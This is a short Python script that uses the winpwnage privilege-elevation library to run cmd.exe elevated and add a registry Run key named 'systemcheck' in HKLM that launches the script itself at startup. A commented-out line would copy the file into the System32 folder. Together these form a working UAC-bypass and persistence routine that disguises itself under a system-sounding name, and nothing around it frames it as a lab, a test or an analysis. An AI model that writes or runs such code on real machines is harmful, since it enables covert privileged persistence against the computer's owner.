from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1
import sys

if getattr(sys, 'frozen', False):
	file_path = sys.executable
	type_of = "exe"
elif __file__:
	file_path = __file__
	type_of = "py"

# elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'cp {file_path} c:\\windows\\system32'])
elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d {file_path}'])
#  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v systemcheck /t REG_SZ /d test